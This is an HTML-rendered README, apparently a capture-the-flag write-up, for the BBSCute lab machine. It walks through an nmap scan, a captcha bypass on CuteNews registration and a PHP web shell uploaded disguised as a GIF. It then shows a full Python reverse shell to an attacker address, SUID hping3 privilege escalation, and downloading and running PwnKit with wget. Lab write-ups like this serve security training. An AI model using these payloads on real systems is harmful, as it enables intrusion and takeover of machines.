@@ -1,0 +1,180 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 192.168.91.128<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/BBSCute]<br/>
+└─# nmap -sC -sV 192.168.91.128 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 03:54 +0630<br/>
+Nmap scan report for 192.168.91.128<br/>
+Host is up (0.21s latency).<br/>
+Not shown: 65530 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp;STATE SERVICE &nbsp;VERSION<br/>
+22/tcp &nbsp;open &nbsp;ssh &nbsp; &nbsp; &nbsp;OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)<br/>
+| &nbsp; 256 24b3df010bcac2ab2ee949b058086afa (ECDSA)<br/>
+|_ &nbsp;256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)<br/>
+80/tcp &nbsp;open &nbsp;http &nbsp; &nbsp; Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Apache2 Debian Default Page: It works<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+88/tcp &nbsp;open &nbsp;http &nbsp; &nbsp; nginx 1.14.2<br/>
+|_http-title: 404 Not Found<br/>
+|_http-server-header: nginx/1.14.2<br/>
+110/tcp open &nbsp;pop3 &nbsp; &nbsp; Courier pop3d<br/>
+|_pop3-capabilities: LOGIN-DELAY(10) IMPLEMENTATION(Courier Mail Server) TOP UTF8(USER) UIDL USER STLS PIPELINING<br/>
+|_ssl-date: TLS randomness does not represent time<br/>
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US<br/>
+| Subject Alternative Name: email:postmaster@example.com<br/>
+| Not valid before: 2020-09-17T16:28:06<br/>
+|_Not valid after: &nbsp;2021-09-17T16:28:06<br/>
+995/tcp open &nbsp;ssl/pop3 Courier pop3d<br/>
+|_pop3-capabilities: LOGIN-DELAY(10) TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) USER UIDL PIPELINING<br/>
+|_ssl-date: TLS randomness does not represent time<br/>
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US<br/>
+| Subject Alternative Name: email:postmaster@example.com<br/>
+| Not valid before: 2020-09-17T16:28:06<br/>
+|_Not valid after: &nbsp;2021-09-17T16:28:06<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 729.40 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Cutenews news management system<br/>
+<br/>
+I found cutenews login and register page. I tried to register but it didn't show captcha for register. I also found captcha.php it show random text for register in that page. So, I decided to catch this request at register page. So, I will tell you how I successfully register.<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Catch the index.php?register page with burpsuite.<br/>
+<br/>
+Step 2:<br/>
+<br/>
+forward the index.php?register page and catch the captcha GET request and send it to repeater and then click "send". Now, you see captcha code for register. Now, go to proxy tab and drop the original captcha.php request.<br/>
+<br/>
+Step 3:<br/>
+<br/>
+now, fill the form with whatever infomation you like and insert the captcha code you got from repeater tab. Boom! you got registered and now you are at dashboard.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got RCE with php file upload as GIF adding "GIF87a" above my php code:<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Go to "Personal Options" page<br/>
+<br/>
+Step 2:<br/>
+<br/>
+create RCE.php file in your machine with this payload:<br/>
+<br/>
+payload - &lt;?php echo system($_GET['cmd']); ?&gt;<br/>
+<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Upload file from "Avatar" Browse.. Button.<br/>
+<br/>
+Step 4:<br/>
+<br/>
+Catch the request with burpsuite and add "GIF87a" above your php code like this:<br/>
+<br/>
+Content-Disposition: form-data; name="avatar_file"; filename="RCE.php"<br/>
+Content-Type: application/x-php<br/>
+<br/>
+GIF87a &lt;---------------- (like this)<br/>
+&lt;?php echo system($_GET['cmd']); ?&gt;<br/>
+<br/>
+<br/>
+And then, forward the request.<br/>
+<br/>
+Step 5:<br/>
+<br/>
+go to uploaded file location ----&gt; right-click the empty image and then click "Open Image In New Tab". Now, execute command with ?cmd=whoami:<br/>
+<br/>
+http://192.168.91.128/uploads/avatar_test_RCE.php?cmd=whoami<br/>
+<br/>
+GIF87a www-data www-data &lt;--------------- you will see output like this.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse shell with python3 from https://www.revshells.com/<br/>
+<br/>
+payload - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.91",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'<br/>
+<br/>
+full url - 192.168.91.128/uploads/avatar_test_RCE.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.91%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22bash%22)%27<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+listening on [any] 4444 ...<br/>
+connect to [192.168.49.91] from (UNKNOWN) [192.168.91.128] 44554<br/>
+www-data@cute:/var/www/html/uploads$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+Got 1st flag (Offensive Security Playground lab)<br/>
+<br/>
+www-data@cute:/home/fox$ cat /var/www/local.txt<br/>
+f827ffcce84045924896df65f34308de<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (SUID /usr/sbin/hping3)<br/>
+<br/>
+After running linpeas, I found SUID Priviliege Escalation Vulnerability in machine so I go to gtfobins and found root shell exploit:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/hping3/#suid<br/>
+<br/>
+www-data@cute:/tmp$ /usr/sbin/hping3 <br/>
+hping3&gt; /bin/sh -p<br/>
+# whoami<br/>
+root<br/>
+<br/>
+Final Flag (Offensive Security Playground lab)<br/>
+<br/>
+# cat proof.txt<br/>
+129c788a27aff217ea2f5a7d5b1189bd<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another Way to Privilege Escalation (Kernel Exploit (PwnKit))<br/>
+<br/>
+I also found this machine is vulnerable for kernel exploit (PwnKit)<br/>
+<br/>
+I transfer PwnKit from my machine with python server:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+192.168.91.128 - - [27/Feb/2023 05:05:30] "GET /PwnKit HTTP/1.1" 200 -<br/>
+<br/>
+<br/>
+Download and execute from victim machine:<br/>
+<br/>
+www-data@cute:/tmp$ wget http://192.168.49.91/PwnKit<br/>
+--2023-02-26 23:35:30-- &nbsp;http://192.168.49.91/PwnKit<br/>
+Connecting to 192.168.49.91:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: ‘PwnKit’<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[===================&gt;] &nbsp;16.41K &nbsp;79.3KB/s &nbsp; &nbsp;in 0.2s &nbsp; &nbsp;<br/>
+<br/>
+2023-02-26 23:35:31 (79.3 KB/s) - ‘PwnKit’ saved [16800/16800]<br/>
+<br/>
+www-data@cute:/tmp$ chmod +x PwnKit <br/>
+www-data@cute:/tmp$ ./PwnKit <br/>
+root@cute:/tmp# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------</body></html>
